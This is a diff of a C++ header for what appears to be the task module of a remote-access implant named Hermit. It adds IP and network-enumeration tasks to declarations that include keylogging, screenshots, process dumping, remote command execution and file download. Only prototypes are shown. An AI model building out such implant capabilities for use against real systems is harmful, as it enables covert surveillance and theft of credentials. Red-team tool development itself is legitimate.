@@ -1,6 +1,7 @@
 #ifndef HERMIT_TASK_HPP
 #define HERMIT_TASK_HPP
 
+#include <winsock2.h>
 #include <windows.h>
 #include <winhttp.h>
 #include <dbghelp.h>
@@ -11,12 +12,13 @@
 #include <tlhelp32.h>
 #include <vector>
 #include "common.hpp"
-#include "constants.hpp"
 #include "convert.hpp"
 #include "fs.hpp"
+#include "ip.hpp"
 #include "keylog.hpp"
+#include "macros.hpp"
+#include "net.hpp"
 #include "screenshot.hpp"
-#include "types.hpp"
 #include "utils.hpp"
 #include "winhttp.hpp"
 #include "winsystem.hpp"
@@ -37,6 +39,7 @@ std::wstring ExecuteTaskDownload(
 	const std::wstring& wDest
 );
 std::wstring ExecuteTaskExecute(const std::wstring& cmd);
+std::wstring ExecuteTaskIp();
 std::wstring ExecuteTaskKeyLog(const std::wstring& wLogTime);
 std::wstring ExecuteTaskKill();
 std::wstring ExecuteTaskLs(const std::wstring& wDir);
@@ -46,6 +49,7 @@ std::wstring ExecuteTaskMv(
 	const std::wstring& wSrc,
 	const std::wstring& wDest
 );
+std::wstring ExecuteTaskNet();
 std::wstring ExecuteTaskProcdump(const std::wstring& wPid);
 std::wstring ExecuteTaskPs();
 std::wstring ExecuteTaskPsKill(const std::wstring& wPid);
